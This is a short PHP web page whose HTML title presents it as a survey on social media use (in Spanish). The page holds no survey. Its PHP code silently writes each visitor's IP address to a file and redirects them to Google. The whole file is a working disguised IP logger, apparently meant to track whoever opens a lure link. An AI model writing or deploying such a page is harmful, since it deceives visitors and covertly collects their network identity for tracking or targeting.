<html>
<head>
    <title> Encuesta sobre uso de redes sociales </title>
</head>
</html>
<?php
$ip = $_SERVER['REMOTE_ADDR'];
file_put_contents("ip", $ip);
header("location: http://www.google.com.mx");
die();
?>
